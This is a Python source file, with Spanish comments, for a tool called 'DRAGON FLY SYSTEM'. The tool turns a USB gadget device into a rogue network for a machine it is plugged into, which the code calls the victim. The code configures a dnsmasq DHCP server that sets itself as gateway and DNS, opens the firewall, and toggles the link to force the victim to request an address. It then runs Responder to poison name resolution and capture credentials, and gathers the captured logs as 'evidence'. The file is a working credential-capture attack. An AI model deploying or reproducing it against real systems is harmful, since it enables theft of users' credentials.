import os
import subprocess
import time
import re
import threading
import glob

class PoisonAttack:
    def __init__(self, interface=None, callback_consola=None, session_dir=None):
        self.interface = interface or self._detectar_interfaz_gadget()
        self.callback = callback_consola
        self.session_dir = session_dir
        self.stop_event = threading.Event()
        self.dns_proc = None
        self.proc_responder = None

    def log(self, texto):
        texto_limpio = re.sub(r'\x1b\[[0-9;]*m', '', texto)
        for simbolo in ['¤', '[0m', '[1;32m', '[1;34m', '[0;33m']:
            texto_limpio = texto_limpio.replace(simbolo, '')
        if self.callback:
            self.callback(f"{texto_limpio}")
        else:
            print(texto_limpio)

    def _detectar_interfaz_gadget(self):
        """
        Busca la interfaz de red que actúa como gadget USB (RNDIS/ECM).
        Verifica que sea de tipo 1 (Ethernet) y que el dispositivo pertenezca al subsistema 'gadget'.
        """
        for iface in os.listdir('/sys/class/net/'):
            if iface == 'lo':
                continue
            type_path = f'/sys/class/net/{iface}/type'
            if not os.path.exists(type_path):
                continue
            with open(type_path) as f:
                iface_type = f.read().strip()
            # Las interfaces gadget son Ethernet (tipo 1)
            if iface_type != '1':
                continue
            # Verificar que es un dispositivo USB gadget (enlace simbólico contiene 'gadget')
            device_path = f'/sys/class/net/{iface}/device'
            if os.path.exists(device_path):
                try:
                    link = os.readlink(device_path)
                    if 'gadget' in link:
                        return iface
                except OSError:
                    pass
            # Fallback adicional: nombres comunes
            if iface.startswith('usb') or iface.startswith('enx'):
                return iface
        # Si no se encontró, intentar con nombres conocidos
        for candidate in ['usb0', 'enx']:
            if os.path.exists(f'/sys/class/net/{candidate}'):
                return candidate
        return 'usb0'  # último recurso

    def _limpiar_procesos_previos(self):
        os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
        os.system("sudo pkill -f responder > /dev/null 2>&1")
        os.system(f"sudo fuser -k 53/udp > /dev/null 2>&1")
        os.system(f"sudo fuser -k 67/udp > /dev/null 2>&1")
        # Detener servicios que pueden interferir
        os.system("sudo systemctl stop systemd-resolved 2>/dev/null")
        os.system("sudo systemctl stop systemd-networkd 2>/dev/null")
        time.sleep(1)

    def start(self):
        self._limpiar_procesos_previos()
        iface = self.interface

        self.log("\n[!] DRAGON FLY SYSTEM")
        self.log(f"[*] Configurando interfaz: {iface}")

        try:
            self.log("[*] Desvinculando interfaz de gestores de red locales...")
            os.system(f"sudo nmcli device set {iface} managed no 2>/dev/null")
            os.system(f"sudo systemctl stop dhcpcd 2>/dev/null")
            os.system(f"sudo dhcpcd -k {iface} 2>/dev/null")
            time.sleep(1)

            ip = "192.168.10.1"
            subnet_mask = "24"
            ip_range = "192.168.10.10,192.168.10.250,255.255.255.0,12h"

            # 1. Primera asignación (Para que los servicios tengan donde anclarse)
            self.log(f"[*] Preparando IP estática {ip}/{subnet_mask}...")
            os.system(f"sudo ip addr flush dev {iface} 2>/dev/null")
            os.system(f"sudo ip addr add {ip}/{subnet_mask} dev {iface} 2>/dev/null")
            os.system(f"sudo ip link set {iface} up")
            os.system("sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null")

            # 2. Abrir Firewall sin restricciones para la interfaz USB
            self.log("[*] Abriendo firewall para la víctima...")
            os.system(f"sudo iptables -A INPUT -i {iface} -j ACCEPT")
            os.system(f"sudo iptables -A OUTPUT -o {iface} -j ACCEPT")

            # 3. Configurar y arrancar dnsmasq ANTES de reiniciar el cable
            os.system("rm -f /tmp/dnsmasq.leases")
            
            config_dhcp = (
                f"interface={iface}\n"
                f"listen-address={ip}\n"
                f"dhcp-range={ip_range}\n"
                f"dhcp-option=3,{ip}\n"
                f"dhcp-option=6,{ip}\n"
                f"dhcp-option=15,\n"
                f"dhcp-option=252,\n"
                f"bind-dynamic\n"              # Clave: Se mantiene vivo aunque la red se reinicie
                f"dhcp-leasefile=/tmp/dnsmasq.leases\n"
                f"dhcp-authoritative\n"        # Impone la IP rápidamente a NetworkManager
                f"no-resolv\n"
                f"no-hosts\n"
                f"port=0\n"                    # Apaga el DNS interno de dnsmasq a favor de Responder
                f"log-dhcp\n"
            )

            with open("dnsmasq_temp.conf", "w") as f:
                f.write(config_dhcp)

            self.log("[*] Iniciando dnsmasq (DHCP)...")
            self.dns_proc = subprocess.Popen(
                ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            # Damos 2 segundos para que dnsmasq empiece a escuchar activamente
            time.sleep(2)

            # Verificar si dnsmasq falló
            if self.dns_proc.poll() is not None:
                err = self.dns_proc.stderr.read()
                self.log(f"[!] dnsmasq falló, reintentando: {err.strip()}")
                self.dns_proc = subprocess.Popen(
                    ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d", "--keep-in-foreground"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )

            # 4. EL "FLAP" MÁGICO (Reinicio físico virtual)
            # Ahora que dnsmasq YA ESTÁ LISTO, tiramos el "cable" y lo volvemos a conectar.
            # Esto soluciona que la PC víctima se haya rendido si la Pi se conectó hace rato.
            self.log("[*] Despertando a la máquina víctima (Flap de cable)...")
            os.system(f"sudo ip link set {iface} down")
            time.sleep(1.5) # Espera necesaria para que el OS de la laptop registre la desconexión
            
            # Linux a veces borra la IP al hacer 'down', así que la reponemos al hacer 'up'
            os.system(f"sudo ip addr add {ip}/{subnet_mask} dev {iface} 2>/dev/null")
            os.system(f"sudo ip link set {iface} up")
            time.sleep(1)

            # 5. Iniciar Responder
            responder_paths = [
                "/usr/share/responder/Responder.py",
                "/opt/Responder/Responder.py"
            ]
            responder_cmd = None
            for path in responder_paths:
                if os.path.exists(path):
                    responder_cmd = ["sudo", "python3", path, "-I", iface, "-wvF"]
                    break
            if responder_cmd is None:
                responder_cmd = ["sudo", "responder", "-I", iface, "-wvF"]

            self.log(f"[+] INTERFAZ LISTA: {iface}")
            self.log(f"[+] IP: {ip}/{subnet_mask}")
            self.log(f"[+] Si la PC estaba dormida, acaba de recibir la petición DHCP.")

            self.proc_responder = subprocess.Popen(
                responder_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )

            # Ciclo de lectura de Responder
            while not self.stop_event.is_set():
                linea = self.proc_responder.stdout.readline()
                if not linea and self.proc_responder.poll() is not None:
                    break
                if linea:
                    self.log(linea.strip())

        except Exception as e:
            self.log(f"\n[!] Error crítico: {e}")
        finally:
            self._cleanup()

   
   
    def _cleanup(self):
        self.log("\n[*] Deteniendo procesos y restaurando red...")
        if self.dns_proc:
            try:
                self.dns_proc.terminate()
                self.dns_proc.wait(timeout=3)
            except:
                self.dns_proc.kill()
            self.dns_proc = None

        if self.proc_responder:
            try:
                self.proc_responder.terminate()
                self.proc_responder.wait(timeout=3)
            except:
                self.proc_responder.kill()
            self.proc_responder = None

        os.system("sudo pkill -f responder > /dev/null 2>&1")
        os.system("sudo pkill -f dnsmasq > /dev/null 2>&1")
        
        # Limpiar las reglas globales de firewall que agregamos
        os.system(f"sudo iptables -D INPUT -i {self.interface} -j ACCEPT 2>/dev/null")
        os.system(f"sudo iptables -D OUTPUT -o {self.interface} -j ACCEPT 2>/dev/null")
        
        os.system("sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1")
        os.system(f"sudo ip addr flush dev {self.interface} > /dev/null 2>&1")
        
        # Restaurar servicios detenidos
        os.system("sudo systemctl start systemd-resolved 2>/dev/null")
        os.system("sudo systemctl start systemd-networkd 2>/dev/null")
        if os.path.exists("dnsmasq_temp.conf"):
            os.remove("dnsmasq_temp.conf")

        if self.session_dir:
            self.log(f"[*] Organizando evidencia en: {os.path.basename(self.session_dir)}")
            os.makedirs(self.session_dir, exist_ok=True)
            for log_dir in ["/usr/share/responder/logs", "/opt/Responder/logs"]:
                if os.path.isdir(log_dir):
                    for f in glob.glob(os.path.join(log_dir, "*")):
                        try:
                            os.rename(f, os.path.join(self.session_dir, os.path.basename(f)))
                        except:
                            subprocess.run(["sudo", "mv", f, self.session_dir], stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "chmod", "-R", "777", self.session_dir], stderr=subprocess.DEVNULL)

        self.log("[+] Sistema restaurado. ¡Cacería finalizada!")
    
    
    def stop(self):
        self.stop_event.set()
        if self.proc_responder:
            try:
                self.proc_responder.terminate()
            except:
                pass
        if self.dns_proc:
            try:
                self.dns_proc.terminate()
            except:
                pass
